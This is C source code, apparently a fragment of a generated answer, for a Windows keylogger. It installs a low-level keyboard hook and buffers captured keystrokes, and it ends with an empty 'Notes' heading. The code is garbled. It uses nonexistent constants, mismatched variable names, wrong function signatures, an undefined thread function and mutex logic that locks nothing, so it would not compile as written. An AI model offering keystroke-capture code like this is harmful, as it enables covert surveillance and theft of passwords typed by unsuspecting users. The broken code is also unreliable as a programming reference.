#include <windows.h>
#include <winuser.h>
#include <stdio.h>
#include <stdlib.h>
#include <thread>

#define MAX_BUFFER_SIZE 1024
#define KEY_BUFFER ((unsigned int)(-1))

static HHOOK hook = NULL;
static char buffer[MAX_BUFFER_SIZE] = {0};
static HANDLE bufferMutex = NULL;
static DWORD bufferSize = 0;

static void KeyboardHookCallback(int nCode, int wParam, int lParam) {
    if (nCode == HCN_KEYDOWN) {
        unsigned int key = wParam;
        if (key >= 0x20 && key <= 0xFF) {
            // Translate to character
            char c = (char)key;
            // Add to buffer
            if (BufferSize < MAX_BUFFER_SIZE) {
                lockBuffer();
                buffer[BufferSize++] = c;
                unlockBuffer();
            }
        }
    }
    return hook;
}

static void lockBuffer() {
    if (bufferMutex == NULL) {
        bufferMutex = CreateMutex(NULL, 0, "KeyboardHook");
    }
}

static void unlockBuffer() {
    if (bufferMutex != NULL) {
        ReleaseMutex(bufferMutex);
        bufferMutex = NULL;
    }
}

int main() {
    hook = SetWindowsHook(WH_KEYBOARD_LL, KeyboardHookCallback);
    if (hook == NULL) {
        printf("Failed to install keyboard hook.\n");
        return 1;
    }

    // Start the hook in a separate thread
    _beginthread(&KeyboardHookThread, 0, 0);

    while (true) {
        // You can add a sleep here or check for termination condition
        Sleep(50);
    }

    Unhook(hook);
    _endthread();
    return 0;
}
```

### Notes:

